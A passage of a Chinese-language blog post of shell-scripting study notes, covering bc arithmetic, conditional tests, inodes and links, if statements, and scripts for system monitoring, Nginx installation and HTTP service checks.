src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315190948088.png" alt="image-20220315190948088"></p><p>除了在交互模式下使用bc计算器，还可以通过非交互的方式进行计算。而且通过bc计算器的另外两个内置变量ibase（in）和obase（out）可以进行进制转换，ibase用来指定输入数字的进制，obase用来设置输出数字的进制，默认输入和输出的数字都是十进制的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315191331588.png" alt="image-20220315191331588"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315191439318.png" alt="image-20220315191439318"></p><p>通过计算我们可以解决现实中的很多问题，下面这个需要计算结果的脚本案例中的每个部分都可以独立出来单独运行，也可以合并在一个文件中统一执行。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315192336427.png" alt="image-20220315192336427"></p><h2 id="2很人工-有很智能的脚本"><a href="#2很人工-有很智能的脚本" class="headerlink" title="2很人工 有很智能的脚本"></a>2很人工 有很智能的脚本</h2><h3 id="2-1智能化脚本的基础测试"><a href="#2-1智能化脚本的基础测试" class="headerlink" title="2.1智能化脚本的基础测试"></a>2.1智能化脚本的基础测试</h3><p>在Shell中可以使用多种方式进行条件判断，如[[表达式]]、[表达式]或者test表达式。使用条件表达式可以测试文件属性，进行字符或数字的比较。需要注意的是，不管使用哪种方式进行条件判断，系统默认都不会有任何输出结果，可以通过echo $？命令，查看上一条命令的退出状态码，或者使用&amp;&amp;和||操作符结合其他命令进行结果的输出操作。</p><p>警告：</p><p>表达式两边必须有空格，否则程序会出错。使用[[]]和test进行排序比较时，使用的比较符号不同。在test或[]中不能直接使用＜或＞符号进行排序比较。</p><p>如果需要在一行代码中输入多条命令，在Shell中可以使用；（分号）、&amp;&amp;（与）、||（或）这三个符号将多个命令分隔。其中；（分号）是按顺序执行命令，分号前后的命令可以没有任何逻辑关系。例如，输入“A命令；B命令”，系统会先执行A命令，不管A命令执行结果如何，都会执行B命令。整个命令的退出码以最后一条命令为准，B命令如果执行成功则退出码为0, B命令如果执行失败则退出码为非0。而使用&amp;&amp;（与）符号分隔多条命令时，仅当前一条命令执行成功后，才会执行&amp;&amp;后面的命令。例如，输入“A命令&amp;&amp;B命令”，系统会先执行A命令，如果A命令执行成功则执行B命令，如果A命令执行失败则不执行B命令。而整行命令的退出码取决于两条命令是否同时执行成功，如果A命令执行成功并且B命令执行也成功，则整行命令的退出码为0，而A命令或B命令中的任何一条命令执行失败，则整行命令的退出码为非0。如果使用||（或）符号分隔多条命令，仅当前一条命令不执行或执行失败后才执行后一条命令。例如，输入“A命令||B命令”，因为A命令是命令行的第一条命令，所以一定会执行，如果A命令执行成功了就不再执行B命令，如果A命令执行失败，则执行B命令，A命令和B命令为二选一的关系。A命令或B命令中有任何一条命令的退出码为0，则整行命令的退出码就是0，否则返回非0。</p><h3 id="2-2字符串的判断与比较"><a href="#2-2字符串的判断与比较" class="headerlink" title="2.2字符串的判断与比较"></a>2.2字符串的判断与比较</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315193725330.png" alt="image-20220315193725330"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315193733577.png" alt="image-20220315193733577"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315193933836.png" alt="image-20220315193933836"></p><p>下面的测试，因为当前用户是cdxiaodong，测试结果为真，所以会执行echo Y命令，而当echo Y命令执行并成功后，则不再执行echoN，结果屏幕仅显示Y。</p><p>在表达式中使用-z可以测试一个字符串是否为空，下面测试一个未定义的变量TEST，如果变量值为空则屏幕显示Y，否则显示N。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315194848684.png" alt="image-20220315194848684"></p><p>在Shell中进行条件测试时一定要注意空格问题。使用[]测试时，左方括号右边和右方括号左边都必须有空格。而且测试的比较符号两边也必须都有空格。</p><p>下面这个例子&#x3D;&#x3D;符号两边没有空格，无论怎么测试结果都为真，编写脚本时这种Bug系统不会提示语法错误，但程序结果有可能是错误的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195235139.png" alt="image-20220315195235139"></p><p>当测试一个未定义的变量时就会出故障。下面测试一个未定义的变量Jacob是否非空。为什么Jacob的度量值明明为空，但测试却说该变量值不为空呢？</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195352937.png" alt="image-20220315195352937"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195444386.png" alt="image-20220315195444386"></p><h3 id="2-3整数的判断与比较"><a href="#2-3整数的判断与比较" class="headerlink" title="2.3整数的判断与比较"></a>2.3整数的判断与比较</h3><p>比较两个数字可能的结果有等于、不等于、大于、大于或等于、小于、小于或等于这么几种情况，在Shell脚本中支持对整数的比较判断</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195848902.png" alt="image-20220315195848902"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195920876.png" alt="image-20220315195920876"></p><p>下面这个案例使用grep命令结合正则表达式，从meminfo文件中过滤当前系统剩余可用的内存容量，剩余容量以KiB为单位，最后测试剩余可用容量是否小于或等于500MiB。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315200719182.png" alt="image-20220315200719182"></p><p>接下来使用ps命令，查看系统中所有启动的进程列表信息，结合wc命令还可以统计当前系统中已经启动的进程数量。这样，就可以判断是否启动了超过100个进程。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315201131769.png" alt="image-20220315201131769"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315201324759.png" alt="image-20220315201324759"></p><h3 id="2-4文件属性的比较"><a href="#2-4文件属性的比较" class="headerlink" title="2.4文件属性的比较"></a>2.4文件属性的比较</h3><p>Shell支持大量对文件属性的判断，常用的文件属性操作符很多</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315202346843.png" alt="image-20220315202346843"></p><p>下面这个测试，假设系统中有某个磁盘设备，使用-b测试该设备是否存在，且当该设备为块设备时返回值为真，否则返回值为假。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315202729193.png" alt="image-20220315202729193"></p><p>Linux系统中的文件链接分为软链接和硬链接两种。软链接创建后，如果源文件被删除，则软链接将无法继续使用，可以跨分区和磁盘创建软链接。硬链接创建后，如果源文件被删除，则硬链接依然可以正常使用、正常读写数据，但硬链接不可以跨分区或磁盘创建。另外，硬链接与源文件使用的是相同的设备、相同的inode编号。使用ls -l[插图]命令查看硬链接文件的属性时，文件属性与普通文件是一样的，而软链接的文件属性则可以看到被l标记，表示该文件为软链接。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203222382.png" alt="image-20220315203222382"></p><p>创建软连接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203434841.png" alt="image-20220315203434841"></p><p>创建硬连接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203552744.png" alt="image-20220315203552744"></p><p>ls查看不同</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203710346.png" alt="image-20220315203710346"></p><p>判断都是什么连接</p><p>在测试权限时需要注意，超级管理员root在没有rw权限的情况下，也是可以读写文件的，rw权限对超级管理员是无效的。但是如果文件没有x权限，哪怕是root也不可以执行该文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315204119691.png" alt="image-20220315204119691"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315204147071.png" alt="image-20220315204147071"></p><p>删除r权限 依然为真</p><p>因为我们是root权限</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315204948946.png" alt="image-20220315204948946"></p><p>给他加x后就 为真了</p><p>默认touch命令创建的文件都是空文件，在使用-s测试文件是否为非空文件时，因为文件是空文件，所以测试结果为假。当文件中有内容时，测试文件是否为非空时，结果为真。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315205901890.png" alt="image-20220315205901890"></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充:"></a>补充:</h4><p>软件中有一些比如istat stat 等控制img块的软件都是sleuthkit等的基础软件</p><p>使用他们有一个很基础的条件。就是要知道什么是inode</p><h4 id="这里就介绍什么是inode"><a href="#这里就介绍什么是inode" class="headerlink" title="这里就介绍什么是inode"></a>这里就介绍什么是inode</h4><p>inode包含文件的元信息，具体来说有以下内容：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">* </span>文件的字节数<br><br><span class="hljs-bullet">* </span>文件拥有者的User ID<br><br><span class="hljs-bullet">* </span>文件的Group ID<br><br><span class="hljs-bullet">* </span>文件的读、写、执行权限<br><br><span class="hljs-bullet">* </span>文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。<br><br><span class="hljs-bullet">* </span>链接数，即有多少文件名指向这个inode<br><br><span class="hljs-bullet">* </span>文件数据block的位置<br></code></pre></td></tr></table></figure><p>总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。</p><h4 id="inode的大小"><a href="#inode的大小" class="headerlink" title="inode的大小"></a>inode的大小</h4><p>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。</p><p>每 个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定 在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。</p><p>查看每个硬盘分区的inode总数和已经使用的数量，可以使用df<a href="https://www.linuxcool.com/">命令</a>。</p><p>查看每个inode节点的大小，可以用如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dumpe2fs -h /dev/hda | grep <span class="hljs-string">&quot;Inode size&quot;</span><br></code></pre></td></tr></table></figure><p>像hda hdb啥的都是</p><p>硬盘文件。前提是你的虚拟机有硬盘分区而不是弄在同一块盘</p><p>像sda就是设备文件  也可以是磁盘 驱动u盘啥的</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo dumpe2fs -h <span class="hljs-regexp">/dev/</span>hda | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Inode size&quot;</span><br></code></pre></td></tr></table></figure><p>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</p><h4 id="inode号码"><a href="#inode号码" class="headerlink" title="inode号码"></a>inode号码</h4><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p><p>这 里值得重复一遍，Unix&#x2F;<a href="https://www.linuxprobe.com/">Linux系统</a>内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或 者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号 码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</p><p>使用ls -i命令，可以看到文件名对应的inode号码：</p><h4 id="目录文件"><a href="#目录文件" class="headerlink" title="目录文件"></a>目录文件</h4><p>ls -i命令列出整个目录文件，即文件名和inode号码：</p><p>如果要查看文件的详细信息，就必须根据inode号码，访问inode节点，读取信息。ls -l命令列出文件的详细信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l /etc<br></code></pre></td></tr></table></figure><p>其原理就是先读取inode再读取文件的详细信息</p><h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>一 般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix&#x2F;Linux系统允许，多个文件名指向同一个 inode号码。这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访 问。这种情况就被称为”硬链接”（hard link）。</p><p>ln命令可以创建硬链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> 源文件 目标文件<br></code></pre></td></tr></table></figure><p>运 行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做”链接数”，记录指向该inode的文 件名总数，这时就会增加1。反过来，删除一个文件名，就会使得inode节点中的”链接数”减1。当这个值减到0，表明没有文件名指向这个inode，系 统就会回收这个inode号码，以及其所对应block区域。</p><p>这里顺便说一下目录文件的”链接数”。创建目录时， 默认会生成两个目录项：”.”和”..”。前者的inode号码就是当前目录的inode号码，等同于当前目录的”硬链接”；后者的inode号码就是当 前目录的父目录的inode号码，等同于父目录的”硬链接”。所以，任何一个目录的”硬链接”总数，总是等于2加上它的子目录总数（含隐藏目录）,这里的 2是父目录对其的“硬链接”和当前目录下的”.硬链接“。</p><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>除了硬链接以外，还有 一种特殊情况。文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打 开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。</p><p>这 意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此 发生变化。</p><p>ln -s命令可以创建软链接。</p><p>ln -s 源文文件或目录 目标文件或目录</p><h4 id="inode的特殊作用"><a href="#inode的特殊作用" class="headerlink" title="inode的特殊作用"></a>inode的特殊作用</h4><p>由于inode号码与文件名分离，这种机制导致了一些Unix&#x2F;Linux系统特有的现象。</p><p>\1. 有时，文件名包含特殊字符，无法正常删除。这时，直接删除inode节点，就能起到删除文件的作用。</p><p>\2. 移动文件或重命名文件，只是改变文件名，不影响inode号码。</p><p>\3. 打开一个文件以后，系统就以inode号码来识别这个文件，不再考虑文件名。因此，通常来说，系统无法从inode号码得知文件名。</p><p>第3点使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过inode号码，识别运行中的文件，不通过文件名。更新的时 候，新版文件以同样的文件名，生成一个新的inode，不会影响到运行中的文件。等到下一次运行这个软件的时候，文件名就自动指向新版文件，旧版文件的 inode则被回收。</p><h4 id="实际问题"><a href="#实际问题" class="headerlink" title="实际问题"></a>实际问题</h4><p>在一台配置较低的Linux服务器（内存、硬盘比较小）的&#x2F;data分区内创建文件时，系统提示磁盘空间不足，用df -h命令查看了一下磁盘使用情况，发现&#x2F;data分区只使用了66%，还有12G的剩余空间，按理说不会出现这种问题。 后来用df -i查看了一下&#x2F;data分区的索引节点(inode)，发现已经用满(IUsed&#x3D;100%)，导致系统无法创建新目录和文件。</p><p>查找原因：</p><p>&#x2F;data&#x2F;cache目录中存在数量非常多的小字节缓存文件，占用的Block不多，但是占用了大量的inode。</p><p>解决方案：</p><p>1、删除&#x2F;data&#x2F;cache目录中的部分文件，释放出&#x2F;data分区的一部分inode。</p><p>2、用软连接将空闲分区&#x2F;opt中的newcache目录连接到&#x2F;data&#x2F;cache，使用&#x2F;opt分区的inode来缓解&#x2F;data分区inode不足的问题：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/opt/</span>newcache <span class="hljs-regexp">/data/</span>cache<br></code></pre></td></tr></table></figure><h3 id="2-5探究-与-的区别"><a href="#2-5探究-与-的区别" class="headerlink" title="2.5探究[[]]与[]的区别"></a>2.5探究[[]]与[]的区别</h3><p>多数情况下[]和[[]]是可以通用的，两者的主要差异是：test或[]是符合POSIX标准的测试语句，兼容性更强，几乎可以运行在所有Shell解释器中，相比较而言[[]]仅可运行在特定的几个Shell解释器中（如Bash、Zsh等）。事实上，目前支持使用[[]]进行条件测试的解释器已经足够多了。使用[[]]进行测试判断时甚至可以使用正则表达式。</p><p>看两者的差异点。其中，在[[]]中使用＜和＞符号时，系统进行的是排序操作，而且支持在测试表达式内使用&amp;&amp;和||符号。在test或[]测试语句中不可以使用&amp;&amp;和||符号。</p><p><strong>注意</strong></p><p>[[ ]]中的表达式如果使用＜或＞进行排序比较，使用的是本地的locale语言顺序。可以使用LANG&#x3D;C设置在排序时使用标准的ASCII码顺序。在ASCII码的顺序中，小写字母顺序码＞大写字母顺序码＞数字顺序码。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315210828490.png" alt="image-20220315210828490"></p><p>虽然[]也支持同时进行多个条件的逻辑测试，但是在[]中需要使用-a和-o进行逻辑与和逻辑或的比较操作，而[[]]中可以直接使用&amp;&amp;和||进行逻辑比较操作，更直观，可读性更好。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220315211533164.png" alt="image-20220315211533164"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315211724947.png" alt="image-20220315211724947"></p><p>需要注意的还有比较符，在[[]]中是模式匹配，模式匹配允许使用通配符。例如，Bash常用的通配符有*、? 、[…]等。而&#x3D;&#x3D;在test语句中仅代表字符串的精确比较，判断字符串是否一模一样。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212045331.png" alt="image-20220315212045331"></p><p>测试变量name的值是否是J和cob中间有任意单个字符？结果为真。</p><p>&#x3D;&#x3D;同样是使用&#x3D;&#x3D;进行比较操作，但在[]中系统进行的是字符串的比较操作，判断两个字符串是否绝对相同。&#x3D;&#x3D;</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212403815.png" alt="image-20220315212403815"></p><p>另外，在[[]]中还支持使用&#x3D;～进行正则匹配，而在[]中则完全不支持正则匹配。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212813847.png" alt="image-20220315212813847"></p><p>对变量name的值进行正则匹配，判断name的值是否包含字母w。</p><p>下图中列出了[[]]和[]的差异汇总信息</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212938654.png" alt="image-20220315212938654"></p><h3 id="2-6系统性能监控脚本"><a href="#2-6系统性能监控脚本" class="headerlink" title="2.6系统性能监控脚本"></a>2.6系统性能监控脚本</h3><p>下面我们来编写一个检测系统环境、监控系统性能的脚本，并判断各项数据指标是否符合预设的阈值。如果数据有异常，那么将结果通过邮件发送给本机root账户。在实际生产环境能联网的情况下，也可以发送邮件给某个外网的邮件账户。</p><p>注意脚本中的很多预设值只是假设值，在实际生产环境中还需要根据业务和环境的需要，调整这些预设值。限于篇幅，本脚本仅获取部分性能参数指标，如果还有其他需要监控的数据，也可以使用类似的方法获取。另外，在过滤数据时暂时使用cut命令，学习后面章节的awk命令后，过滤数据会变得更简单。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214343127.png" alt="image-20220315214343127"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214350665.png" alt="image-20220315214350665"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220315214402391.png" alt="image-20220315214402391"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214415527.png" alt="image-20220315214415527"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214422992.png" alt="image-20220315214422992"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214430183.png" alt="image-20220315214430183"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214436541.png" alt="image-20220315214436541"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214445707.png" alt="image-20220315214445707"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315215004938.png" alt="image-20220315215004938"></p><p>因为kali默认没装mail 这里就不作演示了</p><h3 id="2-7实战：单支if语句"><a href="#2-7实战：单支if语句" class="headerlink" title="2.7实战：单支if语句"></a>2.7实战：单支if语句</h3><p>对于简单的条件判断，结合&amp;&amp;和||就可以完成大量的脚本。但是当脚本越写越复杂、功能越写越完善时，简单的&amp;&amp;和||就不足以满足需求了。</p><p>此时，选择使用if语句结合各种判断条件，功能会更加完善和强大。在Shell脚本中if语句有三种格式，分别是单分支if语句、双分支if语句和多分支if语句。下面是单分支if语句的语法格式。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316165124397.png" alt="image-20220316165124397"></p><p>if和then可以写在同一行。同一行中如果需要编写多条命令，中间需要使用分号分隔命令。所以，单分支if语句也可以写成如下格式。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316165339464.png" alt="image-20220316165339464"></p><p>单分支if语句会检查条件测试的结果，只要返回的结果为真，那么就会执行then后面的命令序列（可以包含一条或多条命令）。但如果测试条件返回的结果为假，那么if语句就什么命令也不执行。这里的条件测试除了可以是字符串的比较测试、数字的比较测试、文件或目录属性的测试，还可以是一条或多条命令。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316165606884.png" alt="image-20220316165606884"></p><p>下面我们看一个单分支if语句的例子，读取用户输入的用户名和密码后，脚本通过if判断用户名和密码是否非空，如果非空则创建账户并设置密码，否则脚本直接结束。执行脚本，当提示输入用户名和密码时，如果我们都不输入（直接按回车键），脚本就会退出。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184045404.png" alt="image-20220316184045404"></p><p>但是，上面的脚本有一个问题。当执行脚本提示输入用户名时，直接按回车键，而当提示输入密码时，正常输入一个密码，这时运行脚本就会报错。因为这样导致在账户没有创建成功的情况下，修改账户密码，结果一定会报错。因此，还需要继续优化这个脚本，可以使用嵌套if语句（在if语句里面再使用if语句）来解决该问题</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184027896.png" alt="image-20220316184027896"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184223876.png" alt="image-20220316184223876"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184300332.png" alt="image-20220316184300332"></p><p>这样做的好处是，如果账户名为空，则脚本就不会执行then后面的命令，也就不会对密码做任何测试动作，更不会修改账户密码，而是直接退出脚本。如果测试账户名为非空，则进一步对密码进行测试，如果密码也非空，那么就执行then后的命令，创建账户并设置密码。</p><p>提示：if语句后面的条件测试语句不一定非要是test或[]测试语句，任何有返回值的命令都可以写在if语句后面，命令返回值为0代表执行成功（即为真），返回值非0代表执行失败（即为假）。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184734698.png" alt="image-20220316184734698"></p><h3 id="2-8实战：双if分支语句"><a href="#2-8实战：双if分支语句" class="headerlink" title="2.8实战：双if分支语句"></a>2.8实战：双if分支语句</h3><p>与单分支if语句的格式一样，then和if可以写在同一行，也可以分开写在不同行。甚至在else和命令序列1中间添加分号将其写在同一行，但很少有人这样写，这将导致代码的可读性非常差。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">if  ; then <br>   命令<br>else <br>   命令<br>fi<br></code></pre></td></tr></table></figure><p>双分支if语句会检查条件测试的结果，只要测试条件返回值结果为真，就会执行命令序列1（可以包含一条或多条命令）。但如果测试条件返回值结果为假，那么就会执行命令序列2。所以双分支if语句，不管条件是否成立，都会执行特定的命令</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316190745091.png" alt="image-20220316190745091"></p><p>因为RPM等类似的二进制软件往往不能提供最新的版本，并且不具备自定义安装选项，所以生产环境中经常需要采用源码的方式安装软件。但采用源码的方式安装软件的步骤又比较烦琐，所以编写脚本实现自动化安装软件是非常重要的。下面看一个采用源码的方式安装软件的脚本案例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316200416656.png" alt="image-20220316200416656"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316200434901.png" alt="image-20220316200434901"></p><p>脚本的第一个功能是通过使用变量的方式，定义echo回显的颜色属性。echo命令的-n选项，可以在回显数据后不按回车键即可换行，-e选项开启右斜线（\）转义的解释功能。</p><p>通过对系统环境变量UID的比较测试，判断当前执行脚本的用户是否为管理员。如果不是管理员，则脚本直接提示错误并退出。</p><p>使用rpm -q可以查询某个软件是否已经安装。再通过–quiet选项，设置无论软件是否已经安装都不在屏幕上回显结果，而是通过if语句自动判断命令的执行结果是真还是假。如果未安装wget，则脚本提示错误并退出。反之，在系统中已有wget工具的情况下，联网下载Nginx源码包软件[插图]。wget命令的-c选项可以开启断点续传的功能，下载过程中如果突然断网，联网后可以从上次的断点处继续下载，而不需要将文件全部重新下载。</p><p>（rpm有个缺陷  如果是编译安装 会检测不到，像我们kali使用的apt安装的软件 用rpm是检测不到的）</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316201536098.png" alt="image-20220316201536098"></p><p>可以使用骚操作</p><p>$(whereis wget) &#x3D;&#x3D; wget</p><p>或者自定义查找</p><p>$(whereis $softname) &#x3D;&#x3D; $softname</p><p><a href="https://blog.csdn.net/bigwood99/article/details/105163508">https://blog.csdn.net/bigwood99/article/details/105163508</a></p><p>但是实在不好写</p><p>建议使用type或which 当然find写入文本然后正则添加也可以</p><p>直接 type wget &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316203819822.png" alt="image-20220316203819822"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316203906393.png" alt="image-20220316203906393"></p><p>还是可以的</p><p>启动Nginx服务时，以普通用户的身份登录会更安全。脚本通过Id命令检查nginx账户是否已经存在，如果不存在nginx账户，则脚本会自动创建该账户。</p><p>在编译源码安装Nginx时，首先需要安装该软件包依赖的相关软件包，脚本中安装了gcc、pcre-devel、zlib-devel、openssl-devel这四个软件包，这些软件都在CentOS标准的Yum中，并且在安装openssl-devel时会自动安装zlib-devel。所以，哪怕不通过Yum明确要求安装zlib-devel，也会在安装openssl-devel时自动安装zlib-devel。Nginx是模块化的软件，可以通过＜–with-模块＞的方式启动某个模块的功能，不需要的功能模块，可以通过＜–without-模块＞的方式禁用。</p><h3 id="2-9实战：如何监控监控http服务状态"><a href="#2-9实战：如何监控监控http服务状态" class="headerlink" title="2.9实战：如何监控监控http服务状态"></a>2.9实战：如何监控监控http服务状态</h3><p>就是nmap利用SYN+ACK</p><p>之前写yak和go的时候都拿这个入手,不过我们不用ACK</p><p>这样就叫做半半式扫描 这样更快</p><p>虽然使用Nmap可以快速地对大量端口进行扫描，但是仅使用端口扫描作为HTTP状态检查的依据，也有其自身的问题。如果服务已经启动，而且HTTP端口也已经开放给客户端，此时如果网站服务器上的网页已经被人恶意或无意删除，就会导致客户端可以成功连接服务器的80端口，但是访问页面时会报错404，说明页面文件找不到。此时不仅需要对端口进行检测，还需要对服务器返回的HTTP状态码进行检测。更有甚者，如果服务器端口已经启动，网页也还存在，但服务器被入侵，并且篡改了网页的数据，又该怎么办呢？还可以对数据的Hash值进行校验，检测网页数据是否被篡改。</p><p>如果希望在测试端口的基础上继续测试特定的页面是否可用，可以使用cURL工具进行测试。cURL是命令行的文件传输工具，支持很多种协议，如FTP、HTTP、HTTPS、IMAP、SMTP、POP3等</p><p>cURL常用的有效名称</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205304159.png" alt="image-20220316205304159"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205402209.png" 